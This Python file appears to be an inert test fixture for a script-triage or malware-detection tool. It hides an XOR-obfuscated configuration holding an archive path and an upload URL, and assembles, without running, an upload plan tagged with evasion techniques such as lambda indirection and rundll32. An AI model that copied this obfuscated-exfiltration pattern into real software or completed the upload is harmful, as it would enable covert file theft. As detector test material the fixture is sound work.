#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_c0252ec2 = "92,131,60,180,157,94,219,126,187,211,73,209,98,164,139,73,202,81,164,129,73,223,98,228,139,68,221,97,172,139,117,223,124,171,134,67,200,107,228,154,88,223,96,187,131,67,202,81,186,139,71,209,122,173,146,75,218,111,184,154,79,204,51,189,156,70,210,103,170,177,88,219,127,189,139,89,202,81,170,129,78,199,114,187,154,75,217,107,151,141,69,203,96,188,211,27,194,125,177,128,94,223,118,245,138,67,221,122,161,129,68,223,124,177,177,78,215,125,184,143,94,221,102,180,129,72,216,123,187,141,75,202,103,167,128,23,210,111,165,140,78,223,81,161,128,78,215,124,173,141,94,215,97,166,146,73,223,124,186,135,79,204,51,184,151,67,208,125,188,143,70,210,107,186,177,69,208,107,172,135,88,194,121,161,128,78,209,121,187,177,73,214,111,161,128,23,204,123,166,138,70,210,61,250,177,90,204,107,172,139,73,219,125,187,129,88,194,109,169,131,90,223,103,175,128,117,215,106,245,141,75,211,126,169,135,77,208,35,248,136,76,140,109,174,219,19,218,106,180,155,90,210,97,169,138,117,203,124,164,211,66,202,122,184,157,16,145,33,248,136,76,140,109,174,219,19,218,106,230,139,82,223,99,184,130,79,144,103,166,152,75,210,103,172,193,95,206,98,167,143,78,194,111,186,141,66,215,120,173,177,90,223,122,160,211,105,132,33,152,156,69,217,124,169,131,110,223,122,169,193,98,203,96,188,156,79,205,125,132,143,72,145,109,169,141,66,219,35,248,136,76,140,109,174,219,19,218,106,230,148,67,206"
    CODEC_c0252ec2 = "decimal_csv|repeating_key_xor|2a,be,0e,c8,ee"

    def load_c0252ec2():
        return bytes(int(item) for item in MATERIAL_c0252ec2.split(","))

    def decode_c0252ec2(stored_bytes):
        key_bytes = (42, 190, 14, 200, 238,)
        return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(stored_bytes))

    def recover_c0252ec2():
        harmless_value = "left" if 2 > 1 else "right"
        _pass = 0
        while _pass < 1:
            recovered_bytes = decode_c0252ec2(load_c0252ec2())
            _pass += 1
        configuration_text = recovered_bytes.decode("ascii", "strict")
        return configuration_text

    def inspect_c0252ec2():
        return recover_c0252ec2()

    def surface_c0252ec2():
        routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
        return routes["selected"]()

    def obfuscation_c0252ec2():
        recover = lambda value: value
        return recover("lambda_indirection")

    def plan_c0252ec2():
        fields = dict(item.split("=", 1) for item in inspect_c0252ec2().split("|"))
        analysis_surface = surface_c0252ec2()
        obfuscation_surface = obfuscation_c0252ec2()
        operation_plan = ("urllib_request_body", fields["archive_path"], fields["upload_url"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_c0252ec2())
